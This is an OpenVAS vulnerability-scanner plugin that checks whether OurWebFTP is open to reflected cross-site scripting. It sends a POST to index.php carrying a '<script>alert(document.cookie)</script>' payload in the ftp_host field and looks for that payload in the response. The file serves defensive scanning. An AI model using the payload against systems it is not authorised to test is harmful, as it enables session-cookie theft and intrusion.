###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ourwebftp_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# OurWebFTP Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site.
  This may allow the attacker to steal cookie-based authentication credentials
  and to launch other attacks.
  Impact Level: Application";
tag_affected = "OurWebFTP version 5.3.5 and prior";
tag_insight = "Input passed via the 'ftp_host' and 'ftp_user' POST parameters to index.php
  is not properly sanitised before being returned to the user. This can be
  exploited to execute arbitrary HTML and script code in a user's browser
  session in context of an affected site.";
tag_solution = "No solution or patch is available as of 03rd December, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.ourwebftp.com/";
tag_summary = "This host is installed with OurWebFTP and is prone to multiple
  cross site scripting vulnerabilities.";

if(description)
{
  script_id(803117);
  script_bugtraq_id(56763);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-03 14:58:31 +0530 (Mon, 03 Dec 2012)");
  script_name("OurWebFTP Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51449/");
  script_xref(name : "URL" , value : "https://www.httpcs.com/advisory/httpcs112");
  script_xref(name : "URL" , value : "https://www.httpcs.com/advisory/httpcs113");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/51449");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Dec/24");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118531/ourwebftp-xss.txt");

  script_description(desc);
  script_summary("Check if OurWebFTP is vulnerable to cross site scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
req = "";
res = "";
dir = "";
host = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

##Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

foreach dir (make_list("/ourwebftp", "", cgi_dirs()))
{
  ## Confirm the application
  if(http_vuln_check(port:port, url: dir + "/index.php",
     pattern:">OurWebFTP", check_header:TRUE,
     extra_check:'>Online FTP Login<'))
  {
    url = dir + "/index.php";

    ## Construct the POST data
    postdata = "ftp_host=%3Cscript%3Ealert%28document.cookie%29%3C%2F" +
               "script%3E&ftp_user=&ftp_pass=&dir=&mwa_control2=op%3" +
               "Alogin&mwb_control2=Enter";

    ## Construct the POST request
    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent:  XSS-TEST\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    ## Confirm exploit worked by checking the response
    if(res && '<script>alert(document.cookie)</script>' >< res &&
       '>Unable to connect to FTP server <' >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
